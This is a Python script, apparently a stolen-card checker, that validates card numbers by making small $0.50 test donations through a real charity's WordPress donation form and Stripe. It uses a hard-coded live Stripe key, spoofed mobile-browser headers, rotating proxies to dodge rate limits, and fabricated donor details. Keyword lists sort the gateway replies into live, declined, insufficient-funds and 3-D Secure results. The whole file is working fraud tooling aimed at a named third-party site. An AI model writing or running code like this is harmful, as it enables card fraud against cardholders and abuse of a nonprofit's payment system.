# gatet.py - Boutique Vacation Rentals Stripe Gateway
# Uses fixed data from untitled.txt and untitled2.txt
# Returns EXACT gateway responses (raw error messages)
# Classification keys are kept for reference and success detection.

import requests
import time
import os
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ========== CLASSIFICATION KEYS (for reference & success detection) ==========
success_keys = [
    "appreciate", "Payment Success", "redirect_to", "thank", "Thanks", "Thank you", "Thank You",
    "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful",
    "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!",
    "donation", "complete", "Payment successful"
]
ccn_keys = [
    "security code is incorrect", "INCORRECT_CVV",
    "card number is incorrect", "invalid", "Your card number is incorrect"
]
declined_keys = [
    "cannot be processed", "CARD_DECLINED", "Your card was declined.",
    "generic_decline", "declined"
]
cvv_keys = [
    "transaction_not_allowed",
    "Your card does not support this type of purchase",
    "do_not_honor", "CVC"
]
insufficient_keys = [
    "insufficient", "INSUFFICIENT_FUNDS",
    "Insufficient Funds", "low funds"
]
expired_keys = ["card has expired"]
otp_keys = [
    "Verifying", "action_required", "verifying", "call_next_method",
    "requires_source_action", "requires_action", "3d_secure", "authenticate"
]

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.load_proxies()

    def load_proxies(self):
        try:
            if os.path.exists("proxy.txt"):
                with open("proxy.txt", "r") as f:
                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"[PROXY] Loaded {len(self.proxies)} proxies")
        except Exception as e:
            print(f"[PROXY] Error loading: {e}")

    def get_next_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

proxy_manager = ProxyManager()

# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, proxies: dict = None):
    """
    Check credit card using the exact flows from untitled.txt and untitled2.txt.
    Returns: "raw_response|amount|time"
    """
    start_time = time.time()

    # Parse card input: n|mm|yy|cvc
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            elapsed = round(time.time() - start_time, 1)
            return f"ERROR: Invalid card format|0.00|{elapsed}"
        n, mm, yy, cvc = parts
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:4]
    except:
        elapsed = round(time.time() - start_time, 1)
        return f"ERROR: Card parsing failed|0.00|{elapsed}"

    amount = "0.50"  # fixed from untitled2.txt

    # ===== FIXED VALUES FROM untitled.txt =====
    guid = "bbfbe16c-dab8-4819-8304-0486368c58d38ad90f"
    muid = "784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd"
    sid = "f8ccbadb-cbdb-41fb-883c-f6f58c36d40386c2a8"
    client_session_id = "2726c4c2-caff-4648-83b5-3c26d4e25a06"
    wallet_config_id = "6d71d587-e798-44b7-847b-2df1dd2ca16e"
    stripe_key = "pk_live_51Ssb1PQKv7Pa5TYrRye5jCnNuoF5AKML2OSyaYolYmYzuIyMCGr7ZcWxiBDI1fpYHvNDpYoxy2J7I2SpdTuwLMZa00IGG1aaXB"

    # ----- Build Stripe data (exact from untitled.txt) -----
    stripe_data_str = (
        f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}"
        f"&guid={guid}&muid={muid}&sid={sid}"
        "&payment_user_agent=stripe.js%2F37af286416%3B+stripe-js-v3%2F37af286416%3B+card-element"
        "&referrer=https%3A%2F%2Fsaphausa.org"
        f"&time_on_page=78798"
        f"&client_attribution_metadata[client_session_id]={client_session_id}"
        "&client_attribution_metadata[merchant_integration_source]=elements"
        "&client_attribution_metadata[merchant_integration_subtype]=card-element"
        "&client_attribution_metadata[merchant_integration_version]=2017"
        f"&client_attribution_metadata[wallet_config_id]={wallet_config_id}"
        f"&key={stripe_key}"
    )

    # ----- Stripe Headers (exact from untitled.txt) -----
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    # ----- Create session (no cookies set) -----
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
    else:
        auto_proxy = proxy_manager.get_next_proxy()
        if auto_proxy:
            session.proxies.update(auto_proxy)

    # Retry logic
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # ===== STEP 1: Stripe Payment Method (NO cookies) =====
    try:
        resp = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data_str,
            timeout=30
        )
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"NETWORK_ERROR: {str(e)}|{amount}|{elapsed}"

    # Retry on 429
    if resp.status_code == 429:
        time.sleep(2)
        try:
            resp = session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data_str,
                timeout=30
            )
        except Exception as e:
            elapsed = round(time.time() - start_time, 1)
            return f"NETWORK_ERROR: {str(e)}|{amount}|{elapsed}"

    # Parse Stripe response – return raw error if not 200
    if resp.status_code != 200:
        try:
            err_json = resp.json()
            err_msg = err_json.get('error', {}).get('message', 'Unknown Stripe error')
        except:
            err_msg = resp.text[:200] if resp.text else "Empty Stripe response"
        elapsed = round(time.time() - start_time, 1)
        return f"{err_msg}|{amount}|{elapsed}"

    try:
        resp_json = resp.json()
        payment_method_id = resp_json.get('id')
        if not payment_method_id:
            elapsed = round(time.time() - start_time, 1)
            return f"STRIPE_ERROR: No payment_method_id in response|{amount}|{elapsed}"
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"JSON_PARSE_ERROR: {str(e)}|{amount}|{elapsed}"

    # ===== STEP 2: WordPress submission (WITH cookies) =====
    wp_url = "https://saphausa.org/wp-admin/admin-ajax.php"
    wp_params = {'t': '1786792919759'}  # from untitled2.txt

    # Build wp data – using exactly the format from untitled2.txt
    wp_data_base = (
        "__fluent_form_embded_post_id=5442&_fluentform_1_fluentformnonce=f58bec634c&_wp_http_referer=%2Fdonation%2F"
        "&names[first_name]=Jhon&names[last_name]=Anderson&email=yangtaru686@gmail.com&phone=%2B12025089708"
        "&input_text=13th%20Street%20Avenue&input_radio=Donation&payment_input=Custom%20Amout"
        "&custom-payment-amount=0.50&message=&payment_method=stripe"
        f"&__stripe_payment_method_id={payment_method_id}"
    )
    wp_data = {
        'data': wp_data_base,
        'action': 'fluentform_submit',
        'form_id': '1',
    }

    # WordPress Headers (exact from untitled2.txt)
    wp_headers = {
        'authority': 'saphausa.org',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://saphausa.org',
        'referer': 'https://saphausa.org/donation/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Cookies for WordPress (from untitled2.txt)
    wp_cookies = {
        '__stripe_mid': muid,
        '__stripe_sid': sid,
    }

    try:
        r2 = session.post(
            wp_url,
            params=wp_params,
            headers=wp_headers,
            data=wp_data,
            cookies=wp_cookies,   # <-- only here, as per untitled2.txt
            timeout=30
        )
    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return f"NETWORK_ERROR (WP): {str(e)}|{amount}|{elapsed}"

    elapsed = round(time.time() - start_time, 1)

    # Parse WordPress response – return raw message
    try:
        resp_json = r2.json()
        # Check for success using our success_keys (or directly)
        if resp_json.get('success') == True:
            return f"Thank you for your donation!|{amount}|{elapsed}"

        # If errors present, extract raw error text
        if 'errors' in resp_json:
            errors = resp_json['errors']
            if isinstance(errors, dict):
                # Combine all error messages into one string
                error_parts = []
                for key, val in errors.items():
                    if isinstance(val, list):
                        error_parts.append(" ".join(val))
                    else:
                        error_parts.append(str(val))
                raw_error = " ".join(error_parts)
            else:
                raw_error = str(errors)
            # Special case: 'restricted' key often means card declined
            if isinstance(errors, dict) and 'restricted' in errors:
                restricted = errors['restricted']
                if isinstance(restricted, list):
                    raw_error = " ".join(restricted)
                else:
                    raw_error = str(restricted)
            return f"{raw_error}|{amount}|{elapsed}"

        # fallback: use 'message' field or the whole json
        message = resp_json.get('message', str(resp_json))
        # Check if it's a success message using keywords
        msg_lower = str(message).lower()
        if any(kw in msg_lower for kw in success_keys):
            return f"Thank you for your donation!|{amount}|{elapsed}"
        return f"{message}|{amount}|{elapsed}"

    except Exception as e:
        # If JSON parse fails, use raw text
        text = r2.text[:200] if r2.text else "Empty WordPress response"
        text_lower = text.lower()
        if any(kw in text_lower for kw in success_keys):
            return f"Thank you for your donation!|{amount}|{elapsed}"
        return f"{text}|{amount}|{elapsed}"

